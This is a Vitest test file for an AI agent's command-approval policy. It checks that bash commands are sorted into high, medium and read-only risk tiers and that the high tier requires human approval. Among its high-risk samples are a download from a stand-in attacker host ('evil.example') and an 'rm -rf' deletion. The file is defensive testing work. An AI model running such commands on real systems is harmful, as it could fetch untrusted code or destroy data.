import { describe, expect, it } from 'vitest'

import { bashApprovalRequired, classifyBashCommand, resolveApprovalRequired } from './approval'

describe('approval policy', () => {
  it('defaults approval by risk level', () => {
    expect(resolveApprovalRequired({ riskLevel: 'low', approvalRequired: false })).toBe(false)
    expect(resolveApprovalRequired({ riskLevel: 'medium', approvalRequired: false })).toBe(false)
    expect(resolveApprovalRequired({ riskLevel: 'high', approvalRequired: false })).toBe(true)
  })

  it('honors explicit approvalRequired and the medium upgrade config', () => {
    expect(resolveApprovalRequired({ riskLevel: 'low', approvalRequired: true })).toBe(true)
    expect(resolveApprovalRequired({ riskLevel: 'medium', approvalRequired: false }, { mediumApprovalRequired: true })).toBe(true)
    expect(resolveApprovalRequired({ riskLevel: 'low', approvalRequired: false }, { mediumApprovalRequired: true })).toBe(false)
  })
})

describe('bash command classification', () => {
  it('classifies high-risk commands', () => {
    expect(classifyBashCommand('git push origin main')).toBe('high')
    expect(classifyBashCommand('rm -rf dist')).toBe('high')
    expect(classifyBashCommand('curl -O https://evil.example/x.sh')).toBe('high')
    expect(classifyBashCommand('npm publish')).toBe('high')
    expect(classifyBashCommand('systemctl restart airi')).toBe('high')
    expect(classifyBashCommand('kubectl delete pod x')).toBe('high')
  })

  it('classifies medium-risk commands', () => {
    expect(classifyBashCommand('npm install')).toBe('medium')
    expect(classifyBashCommand('pnpm add eslint')).toBe('medium')
    expect(classifyBashCommand('git commit -m "fix lint"')).toBe('medium')
    expect(classifyBashCommand('cp a.ts b.ts')).toBe('medium')
    expect(classifyBashCommand('echo x > out.log')).toBe('medium')
    expect(classifyBashCommand('npm run build')).toBe('medium')
  })

  it('defaults read-only queries, tests, and unknown commands to read-only', () => {
    expect(classifyBashCommand('git status')).toBe('read-only')
    expect(classifyBashCommand('git diff --stat')).toBe('read-only')
    expect(classifyBashCommand('npm test')).toBe('read-only')
    expect(classifyBashCommand('pnpm -F @proj-airi/core-agent typecheck')).toBe('read-only')
    expect(classifyBashCommand('ls -la')).toBe('read-only')
    expect(classifyBashCommand('node --version')).toBe('read-only')
  })

  it('maps the tier to the approval requirement', () => {
    expect(bashApprovalRequired('high')).toBe(true)
    expect(bashApprovalRequired('medium')).toBe(false)
    expect(bashApprovalRequired('medium', { mediumApprovalRequired: true })).toBe(true)
    expect(bashApprovalRequired('read-only')).toBe(false)
  })
})
